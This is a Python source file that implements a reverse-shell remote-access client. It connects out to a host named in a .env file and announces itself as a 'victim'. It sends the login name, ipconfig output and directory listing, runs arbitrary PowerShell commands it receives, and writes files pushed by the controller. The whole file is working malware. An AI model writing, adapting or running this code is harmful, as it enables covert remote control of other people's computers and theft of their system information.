import os
import socket
import subprocess
import time

from dotenv import load_dotenv

load_dotenv()

HOST = open(".env", "r+").read()
PORT = 21214

def send_ok(sock):
    sock.send("OK".encode())
def powershell(data):
    return subprocess.check_output(f"powershell {data}", shell=True).decode("ansi")


# OPEN THE CONNECTION


MAX_BYTE = 4 * 1024


def wait_in_silent():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Waiting in silent to connect !")
    while True:
        try:
            sock.connect((HOST, PORT))
            break
        except TimeoutError:
            print("Connection timed out, retrying in 5sec...")
            time.sleep(5)
            continue
        except ConnectionRefusedError:
            print("Connection refused by host. Retrying in 5sec...")
            time.sleep(5)
    print("Connected !")
    time.sleep(0.2)
    # sending welcome packet !
    print("Sending welcome packet !")
    sock.send(
        f"Hello I'm a victim and I like to share you information about me !\nMy name is: {os.getlogin()}".encode())
    sock.send(f"{os.getlogin()}|{powershell('ipconfig')}|{powershell('dir')}".encode())
    return sock


while True:
    sock = wait_in_silent()

    while True:
        try:
            print("Waiting for cmd !")
            cmd = sock.recv(MAX_BYTE).decode()
            send_ok(sock)
            if cmd == "disconnect":
                print("Monitor ask to quit ! Closing !")
                sock.close()
                break

            if cmd == "pwshl":
                data = sock.recv(MAX_BYTE).decode()
                send_ok(sock)
                try:
                    rtn = powershell(data)
                except subprocess.CalledProcessError:
                    rtn = "Error executing command!"
                except:
                    rtn = "An error in the command executer occurred !"
                print(f"CMD: {rtn}")
                sock.send(rtn.encode())

            if cmd == "pushfile":
                print("Starting receiving file !")
                BUFFER_SIZE = int(sock.recv(MAX_BYTE).decode())
                send_ok(sock)
                file_name = sock.recv(MAX_BYTE).decode()
                send_ok(sock)

                print("Starting download !")
                file = open(file_name, "w")
                l = ""
                i = 0
                while True:
                    l = sock.recv(BUFFER_SIZE).decode()
                    if l != "||END OF THE TRANSMISSION !||":
                        file.write(l)
                        print(f"Block {i} receive !")
                        i += 1
                    else:
                        send_ok(sock)
                        break
                    send_ok(sock)
                file.close()
                print("Download finished !")

        except ConnectionResetError:
            print("The connection has been interrupt... Closing!")
            sock.close()
            break
    print("Waiting 5 seconds...")
    time.sleep(5)
